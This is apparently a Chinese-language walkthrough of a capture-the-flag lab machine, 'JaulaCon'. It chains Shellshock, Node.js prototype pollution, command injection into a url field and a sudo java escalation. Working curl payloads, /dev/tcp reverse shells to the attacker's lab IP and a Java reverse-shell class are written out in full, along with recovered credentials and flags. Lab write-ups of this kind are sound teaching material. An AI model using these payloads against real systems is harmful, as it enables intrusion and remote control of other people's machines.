# JaulaCon

2025.03.08 https://thehackerslabs.com/jaulacon/

## Ip

192.168.5.40

## Scan

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3333/tcp open  dec-notes
8080/tcp open  http-proxy
```

80 为静态 web，发现 2 个顾客的人名 Jamesh Dame 和 Jumini Kiri ，其他无可用信息。

3333 对应 Node.js，访问后直接跳转到登陆 http://192.168.5.40:3333/login 目前没有登陆用户名和密码，简单测试也不存在 sql 注入。

8080 显示 apache 页面，扫描出了 http://192.168.5.40:8080/cgi-bin/ :

```
dirb http://192.168.5.40:8080/

gobuster dir -t 100 -k -e -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://192.168.5.40:8080/cgi-bin/ -x sh,py,cgi,perl
```

这里找到 cgi 文件 http://192.168.5.40:8080/cgi-bin/agua.cgi 显示：

```
Test
Vulnerable
This is a test
```

像是有 shellshock，进行探测，证明存在：

```
curl -H 'User-Agent: () { :;}; echo; echo 1' http://192.168.5.40:8080/cgi-bin/agua.cgi
curl -H 'User-Agent: () { : ;}; echo; /bin/bash -c "echo 1"' http://192.168.5.40:8080/cgi-bin/agua.cgi
或者
nmap 192.168.5.40 -p 8080 --script=http-shellshock --script-args uri=/cgi-bin/agua.cgi
```

当 Bash<=4.3，bash 使用的环境变量是通过函数名称来调用的，以“(){”开头通过环境变量来定义的。而在处理这样的“函数环境变量”的时候，并没有以函数结尾“}”为结束，而是一直执行其后的 shell 命令。

然后执行反弹 shell 操作：

```
curl -H 'User-Agent: () { : ;}; echo; /bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1"' http://192.168.5.40:8080/cgi-bin/agua.cgi
```

或者使用另外一个漏洞利用库进行利用 https://github.com/nccgroup/shocker :

```
python2  ./shocker/shocker.py --Host 192.168.5.40 --port 8080 --command "/bin/cat /etc/passwd" --cgi /cgi-bin/agua.cgi
```

然后执行反弹命令，在 kali 上得到了反弹的 shell。先看到了这个 cgi 的源码：

```
www-data@ebe553aaa355:/var/www$ cat /usr/lib/cgi-bin/agua.cgi
#!/bin/bash

echo "Content-type: text/plain"
echo
echo
echo "Test"
echo
echo

# Vulnerable line
env x='() { :;}; echo Vulnerable' bash -c "echo This is a test"
```

进入系统后，发现是在 docker 容器中，有 .dockerenv 文件，但是没有任何特权，不能提权到宿主机。

发现隐藏文件 /opt/.credenciales : `Shellychosk:Portidrea345ñ` 可能是 ssh 或者是 3333 那个登陆页面的用户凭据。不是 ssh 的，是 3333 端口的。

登陆后，可以输入 url 下载文件，这里可能存在 SSRF。输入一个 http 请求，提示不是管理员，需要寻找提升到管理员的方法。

3333 对应的 web 服务是 Node.js 搭建的，可能存在 Prototype Pollution。利用过程如下：

1. 先使用上面的用户凭据登陆，然后获得 cookie 中的 admin_session 值:

```
curl -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=Shellychosk&password=Portidrea345ñ' http://192.168.5.40:3333/login -v

admin_session=e4ad770982de667ccfcb380c13a87bc30f0e1e91bca7a223ff9461345507672a4b4f255db1925f0bb06f1153496e3ecca34b28e168c42addeb094e7ea21ed2f2
```

2. 进行原型链污染，会返回 Forbidden:

```
curl -X POST -H 'Content-Type: application/json' -d '{"url":1,"__proto__":{"admin":"true","isAdmin":"true","isadmin":"true"}}' http://192.168.5.40:3333/admin/check_url -v
```

3. 再次访问 check_url，这时系统内部的属性已经变成 admin，执行后会显示 File Downloaded：

```
curl -X POST -b 'admin_session=e4ad770982de667ccfcb380c13a87bc30f0e1e91bca7a223ff9461345507672a4b4f255db1925f0bb06f1153496e3ecca34b28e168c42addeb094e7ea21ed2f2' -H 'Content-Type: application/json' -d '{"url":1,"__proto__":{"admin":"true","isAdmin":"true","isadmin":"true"}}' http://192.168.5.40:3333/admin/check_url -v
```

4. 执行命令验证(猜测目标机器上使用的是 Node.js 中的 exec 执行的系统命令，并且使用的是 wget url -O 这种形式进行的下载，url 现在可控，需要把前面和后面必合掉才能执行自己的命令)：

```
curl -X POST -b 'admin_session=e4ad770982de667ccfcb380c13a87bc30f0e1e91bca7a223ff9461345507672a4b4f255db1925f0bb06f1153496e3ecca34b28e168c42addeb094e7ea21ed2f2' -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'url=; ping -c 5 192.168.5.3 #' http://192.168.5.40:3333/admin/check_url -v
```

5. 执行反弹 shell

```
curl -X POST -b 'admin_session=e4ad770982de667ccfcb380c13a87bc30f0e1e91bca7a223ff9461345507672a4b4f255db1925f0bb06f1153496e3ecca34b28e168c42addeb094e7ea21ed2f2' -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'url=; /bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1" #' http://192.168.5.40:3333/admin/check_url -v
```

得到了反弹的 shell，在用户 jaula 下拿到了 user flag：

```
jaula@JaulaCon:~$ cat user.txt
3ac6640322d7d06957d3773fab3b27b7
```

sudo -l 显示 (root) NOPASSWD: /usr/bin/java 直接提权到 root：

创建 shell.java 文件：

```
public class shell {
    public static void main(String[] args) {
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "$@| bash -i >& /dev/tcp/192.168.5.3/8888 0>&1")
            .redirectErrorStream(true);
        try {
            Process p = pb.start();
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
```

javac shell.java & java shell 在 kali 上监听 8888 得到反弹的 shell，读取到最终的 root flag：

```
root@JaulaCon:~# cat root.txt
bdc7c8e1ce71e0ebff2d76d9b58c9b74
```
